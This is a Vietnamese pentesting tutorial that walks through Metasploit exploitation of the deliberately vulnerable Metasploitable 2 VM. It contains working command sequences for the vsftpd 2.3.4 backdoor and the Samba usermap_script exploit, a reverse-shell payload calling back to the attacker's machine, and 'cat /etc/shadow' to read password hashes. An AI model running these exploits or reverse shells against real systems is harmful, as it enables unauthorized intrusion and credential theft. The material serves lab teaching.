# ⚔️ System Hacking: Metasploit & Reverse Shell

> [← Back to Network Security](../README.md)

Chào mừng đến với "The Dark Side".
Hôm nay chúng ta sẽ dùng **Metasploit Framework** - vũ khí hạng nặng của mọi Pentester - để chiếm quyền điều khiển server nạn nhân.

---

## 1. Reverse Shell là gì?

*   **Bind Shell (Bình thường):** Hacker kết nối ĐẾN máy nạn nhân (Attacker -> Victim).
    *   *Vấn đề:* Firewall thường chặn kết nối ĐẾN (Incoming).
*   **Reverse Shell (Đảo ngược):** Máy nạn nhân kết nối NGƯỢC LẠI máy Hacker (Victim -> Attacker).
    *   *Tại sao hiệu quả:* Firewall thường cho phép kết nối RA (Outgoing) để user lướt web. Hacker lợi dụng điều này để lách qua tường lửa.

---

## 2. Lab thực hành (Trên máy ảo Metasploitable 2)

**Mục tiêu:** Khai thác lỗ hổng trong dịch vụ FTP (`vsftpd 2.3.4`) để lấy quyền root.

### **Bước 1: Reconnaissance (Thám thính)**
Trên máy Kali, dùng Nmap quét xem máy nạn nhân chạy dịch vụ gì.

```bash
nmap -sV 192.168.56.102
```
*   *Kết quả:* Port 21 đang mở, chạy version `vsftpd 2.3.4`.
*   *Google:* "vsftpd 2.3.4 exploit" -> Có backdoor nổi tiếng!

### **Bước 2: Khởi động Metasploit**
Trên máy Kali, mở Terminal:
```bash
msfconsole
```
(Chờ một chút để load module, logo Metasploit sẽ hiện ra).

### **Bước 3: Tìm kiếm & Chọn Exploit**
Trong `msf >` prompt:
```bash
search vsftpd
# Kết quả: exploit/unix/ftp/vsftpd_234_backdoor
```

Chọn exploit này:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### **Bước 4: Cấu hình (Set Options)**
Xem cần cấu hình gì:
```bash
show options
```
*   `RHOSTS` (Remote Host): IP máy nạn nhân.
*   `RPORT` (Remote Port): Port mục tiêu (mặc định 21).

Set IP máy Metasploitable (Victim):
```bash
set RHOSTS 192.168.56.102
```

### **Bước 5: Fire! (Tấn công)**
```bash
exploit
```
*   Metasploit sẽ kết nối đến port 21, kích hoạt backdoor.
*   Nếu thành công, bạn sẽ thấy dòng: `Command shell session 1 opened`.

### **Bước 6: Post-Exploitation (Chiếm quyền)**
Bây giờ bạn đang ở trong máy nạn nhân! Thử gõ lệnh Linux:

```bash
whoami
# Output: root (Bạn đã là VUA của máy này!)

uname -a
# Xem thông tin hệ điều hành.

cat /etc/shadow
# Xem file chứa hash mật khẩu của toàn bộ user.
```

---

## 3. Bài tập nâng cao (Meterpreter)

Thử khai thác lỗ hổng khác: **Samba (usermap_script)** trên port 139/445.
1.  `search samba` -> Chọn `exploit/multi/samba/usermap_script`.
2.  `set RHOSTS 192.168.56.102`.
3.  Set Payload mạnh hơn:
    ```bash
    set PAYLOAD cmd/unix/reverse
    set LHOST 192.168.56.101  # IP máy Kali của bạn
    ```
4.  `exploit`.

> **Cảnh báo:** Chỉ thực hiện trên máy ảo Lab của bạn. Tấn công máy người khác không xin phép là đi tù đấy!
